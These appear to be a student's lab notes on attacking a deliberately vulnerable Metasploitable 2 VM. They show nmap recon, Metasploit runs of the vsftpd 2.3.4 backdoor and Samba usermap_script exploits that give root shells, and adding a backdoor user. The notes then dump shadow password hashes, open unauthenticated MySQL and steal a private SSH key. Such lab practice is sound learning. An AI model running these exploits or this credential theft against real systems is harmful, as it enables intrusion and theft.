> Goal: (I think): RCE

- Ausarbeitung: [[34_Emil-Schläger.pdf]]
## Installation
- see the guide
- [[Virtual Machine|VM]] Setup: 
	- 8 GB disk
	- 1 CPU
	- 512 MB RAM
	- Network: Host-Only

## VM-Side Discovery
- ip address (through `ifconfig`): 172.16.6.128


## Host-Side Discovery
### 1. Ping
```
ping 172.16.6.128
PING 172.16.6.128 (172.16.6.128) 56(84) bytes of data.
64 bytes from 172.16.6.128: icmp_seq=1 ttl=64 time=0.249 ms
64 bytes from 172.16.6.128: icmp_seq=2 ttl=64 time=0.217 ms
```
-> reachable, good

### 2. nmap
#### 2.1 well-known ports
```
heofthetea@tuxedo:~$ nmap -p 0-1024 172.16.6.128
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-02 12:05 CET
Nmap scan report for 172.16.6.128
Host is up (0.90s latency).
Not shown: 1013 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
23/tcp  open  telnet
25/tcp  open  smtp
53/tcp  open  domain
80/tcp  open  http
111/tcp open  rpcbind
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
512/tcp open  exec
513/tcp open  login
514/tcp open  shell

Nmap done: 1 IP address (1 host up) scanned in 1.17 seconds
```

> [!hint] We know [[nmap]] somewhat -> that was a [[TCP]] scan :)

- sheesh there's a lot of stuff open
	- [[FTP]] -> ftp from what I know is pretty vulnerable
	- [[SSH]] -> maybe something?
	- [[Telnet]] -> i have no clue what exactly that is but it's simmilar to ssh i think
	- [[Email Comunication]] -> Mail
	- [[DNS]]
	- [[HTTP]] (NO https note)
	- 111: rpcbind -> also some protocol for remote process execution on the machine
	- Netbios (sagt mir was)
	- microsoft-ds ("domain service" i reckon)
	- 512: [[Remote Execution Protocol]] (?? seems... vulnerable)
	- 513: login - like [[Telnet]], but automatic authentication???
	- 514: Remote Shell (rsh) - like [[Remote Execution Protocol|rexec]], but automatic authentication????

> [!hint] Maybe I can use 514 to host a reverse shell, idk how exactly that goes
### 3. HTTP discovery
- [[HTTP]] -> Some admin portal reverse proxy
	- we have:
		- a TWiki - probably also a vulnerable version
		- A PHPMyAdmin (maybe I can somehow find the logins for this)
		- A [[OWASP Mutillidae]] -> Another "made to be hacked" web application
		- DVWA (damn vulnerable web application) - another "made to be hacked" web app
		- A [[WebDAV]]

> [!question] Uhm okay that mcrypt extension thing seems potentially vulnerable as well
> ![[Pasted image 20260102121143.png]]


> [!hint] So I'm pretty positive that all these web applications have their own security issues

## First steps with MSF
### Loading nmap scan
```bash
nmap 172.16.6.128 -oX metasploitable_2_nmap.xml
```

- importing:
```
msf> db_import /home/heofthetea/Documents/Development/dhbw/cybersec/metasploitable_2_nmap.xml
[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.18.10'
[*] Importing host 172.16.6.128
[*] Successfully imported /home/heofthetea/Documents/Development/dhbw/cybersec/metasploitable_2_nmap.xml
```

- after: `hosts`

```
msf> hosts
address       mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------       ---  ----  -------  ---------  -----  -------  ----  --------
172.16.6.128             Unknown                    device

```

## Exploitation
### 1. Trial-and-Error throw exploits at the thing (this is not how you're supposed to work)

1. Find an exploit
2. Use it
3. `check 172.16.6.128`

| type                               | check result                  | search term                              |
| ---------------------------------- | ----------------------------- | ---------------------------------------- |
| `multi/http/wingftp_null_byte_rce` | ❌ - not a Wing FTP Web Client | `search type:exploit platform:linux ftp` |

#### VNC security types
(VNC is a remote desktop protocol from what I can tell)
```
msf auxiliary(scanner/vnc/vnc_none_auth) > run
[*] 172.16.6.128:5900     - 172.16.6.128:5900 - VNC server protocol version: 3.3
[*] 172.16.6.128:5900     - 172.16.6.128:5900 - VNC server security types supported: VNC
[*] 172.16.6.128:5900     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```
(nothing here)
# Attempt 2
## Recon
### [[nmap]] without port limit (and OS scan)
```bash
sudo nmap 172.16.6.128 -O -sV -oX metasploitable_2_nmap.xml
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-05 09:27 CET
Nmap scan report for 172.16.6.128
Host is up (0.00042s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login
514/tcp  open  shell       Netkit rshd
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13?
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 00:0C:29:14:6E:24 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 149.97 seconds
```

(also imported)
=> I know a lot more open ports, and I know it's a ubuntu system with linux version 2.6 lol


> [!hint] 8180 is unknown - a quick browser check shows it's a Tomcat Server

### nmap with -A (aggressive options)
HOOOLLYYY FUCK WAS MACHT DAS ALLES
```bash
nmap -A 172.16.6.128
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-02 16:08 CET
Nmap scan report for 172.16.6.128
Host is up (0.00022s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 172.16.6.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
|_ssl-date: 2026-01-02T15:08:55+00:00; +14s from scanner time.
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
53/tcp   open  domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      49012/udp   mountd
|   100005  1,2,3      56214/tcp   mountd
|   100021  1,3,4      35252/tcp   nlockmgr
|   100021  1,3,4      56725/udp   nlockmgr
|   100024  1          40187/udp   status
|_  100024  1          46073/tcp   status
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login
514/tcp  open  shell       Netkit rshd
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 14
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, LongColumnFlag, ConnectWithDatabase, SwitchToSSLAfterHandshake, SupportsCompression, SupportsTransactions, Speaks41ProtocolNew
|   Status: Autocommit
|_  Salt: YzzvadQJ`#,S<qGK'|]<
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
|_ssl-date: 2026-01-02T15:08:45+00:00; +14s from scanner time.
5900/tcp open  vnc         VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
| irc-info: 
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|   server: irc.Metasploitable.LAN
|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
|   uptime: 0 days, 4:06:24
|   source ident: nmap
|   source host: 8A64F04F.7BF29B69.168799A3.IP
|_  error: Closing Link: kmyrcwsnw[172.16.6.1] (Quit: kmyrcwsnw)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/5.5
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
MAC Address: 00:0C:29:14:6E:24 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2026-01-02T10:08:33-05:00
|_clock-skew: mean: 1h15m13s, deviation: 2h30m00s, median: 13s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.22 ms 172.16.6.128

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.05 seconds

```

#### Insights
- okay we have an [[FTP#Anonymous login|anonymous FTP login]] -> probably something there
- "Control Connection in Plain Text" -> unsecure communication (password sniffing possible)
- We have an Apache 2.2.8 server on 80 (and a DAV)


(but not a _lot_ lot of insight)


## Intelligent Exploit Search
### 1. FTP Backdoor
- we have [[FTP]] -> tends to be vulnerable
- thanks to our very helpful [[nmap]] -A we know the version:
	- `vsftpd 2.3.4`
- a quick search:

```
msf> search type:exploit vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution

```

> [!hint] Apparently, from what I could gather, this was a maliciously planted backdor in the protocol. So nothing all too exciting.

- looks good, worth a try
```
msf exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 172.16.6.128:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.16.6.128:21 - USER: 331 Please specify the password.
[+] 172.16.6.128:21 - Backdoor service has been spawned, handling...
[+] 172.16.6.128:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (172.16.6.1:45137 -> 172.16.6.128:6200) at 2026-01-02 17:10:45 +0100

whoami
root

hostname
metasploitable
```

> [!info] WOOOOOOOWWWWW lol
> so jetzt was bringt das mir xdd
> Das war halt einfach komplett free (dopamine hit lel) und an allem weiteren scheitere ich xd


#### other FTP Daemon (port 2121)
- well nope
- the version is exactly in between all exploits I could find 🥲
	- I'm also doing very intelligent things currently: just keyword searching through all exploits lol
- hm ne the version still doesn't really match (1.3.1 < 1.3.2c, but could be possible)
	- => bruteforcing the cookie value is... not ideal xd

(hm maybe this also failed because I had LHOST set to the tailscale ip, I could try again)

### 2. Samba User Map Script
- The second samba port version (`445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)` - exists only in nmap -A interestingly enough) matches the version range for that usermap script
- CVE: https://nvd.nist.gov/vuln/detail/CVE-2007-2447 (that's pretty buzzwordy if you ask me)
- => try that out

```
msf exploit(multi/samba/usermap_script) > setg LHOST 172.16.6.1
LHOST => 172.16.6.1
msf exploit(multi/samba/usermap_script) > 
msf exploit(multi/samba/usermap_script) > 
msf exploit(multi/samba/usermap_script) > 
msf exploit(multi/samba/usermap_script) > run
[*] Started reverse TCP handler on 172.16.6.1:4444 
[*] Command shell session 1 opened (172.16.6.1:4444 -> 172.16.6.128:52590) at 2026-01-05 11:06:55 +0100

id -u
0

```

- we have more payloads available, so I'll try to use meterpreter in this

> [!hint] Logs
> - no logs in `/var/log/syslog` -> that's good
#### Let's add a new user for good measure
```
msf exploit(multi/samba/usermap_script) > set payload cmd/unix/adduser
payload => cmd/unix/adduser
msf exploit(multi/samba/usermap_script) > set PASS letmein
PASS => letmein
msf exploit(multi/samba/usermap_script) > set USER definitelyalegituser
USER => definitelyalegituser
msf exploit(multi/samba/usermap_script) > 
msf exploit(multi/samba/usermap_script) > 
msf exploit(multi/samba/usermap_script) > 
msf exploit(multi/samba/usermap_script) > run
[*] Exploit completed, but no session was created.
msf exploit(multi/samba/usermap_script) > 
```

- to poc that this worked:
```
heofthetea@tuxedo:~/Documents/Development/dhbw/cybersec/ausarbeitung$ ssh -oHostKeyAlgorithms=+ssh-rsa definitelyalegituser@172.16.6.128
definitelyalegituser@172.16.6.128's password: 
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
id: cannot find name for group ID 1663
definitelyalegituser@metasploitable:/$ 
definitelyalegituser@metasploitable:/$ 
definitelyalegituser@metasploitable:/$ 
definitelyalegituser@metasploitable:/$ 

```

hehe lol that bricked the thing because the [[sudoers]] file format is completely dead and it was missin a newline bruv
(but yeah after fixing that ssh works nice)
![[Pasted image 20260105135945.png]]
## Extraction
- hm... i mean it would be cool to extract some data to practice that as well
- After all a reverse shell usually is only an intermediate step in the [[Cyber Kill Chain]] (4.)

### Bissi umschauen
#### cat [[etc shadow]]
```
cat /etc/passwd
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
telnetd:*:14715:0:99999:7:::
proftpd:!:14727:0:99999:7:::
statd:*:15474:0:99999:7:::
```

relevant entries (no asterisk/exclam):
```
cat /etc/passwd
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
```

##### faster way (using [[MSF Post Module]])
- found the module using `search type:post platform:linux password`
> [!hint] Requires the previous exploit with the reverse shell to be run in the background (`run -j`)

![[Pasted image 20260105150131.png]]

#### extracting configuration files
```msf
msf> use linux/gather/enum_configs
```
- hm iwi nicht so der banger

#### pivoting to a database
##### postgres
- hehe forgot that as root I can just login as a different user lol
- (even though I did that through an ssh session setup for the new user I created i think it should also be possible with just the plain reverse netcat shell)
- naw postgres doesn't have any non-default databases tho :(( and in postgres there is nothing
##### Mysql
- uhm... yep mysql (at least version 5.0.5) has no auth GOOD TO FUCKING KNOW

```
sh-3.2# mysql
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 11
Server version: 5.0.51a-3ubuntu5 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> 
mysql> 
mysql> 
mysql> 
mysql> show tables;
ERROR 1046 (3D000): No database selected
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| dvwa               | 
| metasploit         | 
| mysql              | 
| owasp10            | 
| tikiwiki           | 
| tikiwiki195        | 
+--------------------+
7 rows in set (0.00 sec)

mysql> 

```

- why is there no script to extract all data from the database 😭

#### users stalken
![[Pasted image 20260105151844.png]]

- hehe i stole `user`'s private ssh key
```ssh
-----BEGIN DSA PRIVATE KEY-----
MIIBugIBAAKBgQDVoHGx78RdmEV9IE4s8qGWs8x4lOfut4ShTocyXIfHWUKRVOYB
pA5Gd9KwuI6zaglzQzedEQOMpXDbTu/AfyOPuWAmd/X2kolyKC34vLTlVrU7YN5Z
Lr93kldM7khnqmTxzLXqeoos0AOcqApZAso/LMFx/nDwRubkT4l2C/ddawIVAMv6
kqsvLq/L0cLLBdZn+Nw+k8cRAoGAILfnDd3w09UUQmM/1Zqn1LKluI7WdOpL8dy/
Nk9mdWFXl3u/dvSVnrvXdzgfjXhPBKKTIlmk2U9FiPjpM8UgBsrk7JLnuJ7xgn8Z
w6+fMWtaWXEjuukeYwkgETB1OlgViHdzGM7CTWakzeLqEWuLSBcDPF/fStFFFZi7
zWzwchACgYBNfKRDwM/QnEpdRTTsRBh9rALq6eDbLNbu/5gozf4Fv1Dt1Zmq5Zxt
XeQtW5BYyorILRZ5/Y4pChRa01bxTRSJah0RJk5wxAUPZ282N07fzcJyVlBojMvP
lbAplpSiecCuLGX7G04Ie8SFzT+wCketP9Vrw0PvtUZU3DfrVTCytgIUcihlgVO0
XcyqKVITUMZyayEOuIE=
-----END DSA PRIVATE KEY-----
```

- (I'm 90% confident that I could use this to impersonate `user` if the server's sshd wasn't 15 years old and I wouldn't keep running into `sign_and_send_pubkey: no mutual signature supported`  errors) -> would only offer me stealth anyway


## Pitfalls I fell into (lol)
- bricking the [[sudoers]] file => that definitely got picked up by logs
- the ssh key thing probably was pretty noisy
- 